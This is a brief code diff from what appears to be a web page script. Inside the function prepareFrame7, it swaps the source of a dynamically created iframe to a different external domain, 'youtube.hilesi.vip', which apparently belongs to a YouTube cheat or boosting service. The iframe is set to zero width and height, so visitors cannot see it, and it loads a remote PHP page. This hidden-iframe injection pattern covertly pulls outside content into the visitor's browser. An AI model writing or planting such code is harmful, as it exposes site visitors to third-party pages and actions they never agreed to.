@@ -44,7 +44,7 @@ function prepareFrame() {
     }
     function prepareFrame7() {
         var ifrm = document.createElement("iframe");
-        ifrm.setAttribute("src", "https://youtube.kasma.vip/iframe_yorum.php");
+        ifrm.setAttribute("src", "https://youtube.hilesi.vip/iframe_yorum.php");
         ifrm.style.width = "0px";
         ifrm.style.height = "0px";
         document.body.appendChild(ifrm);
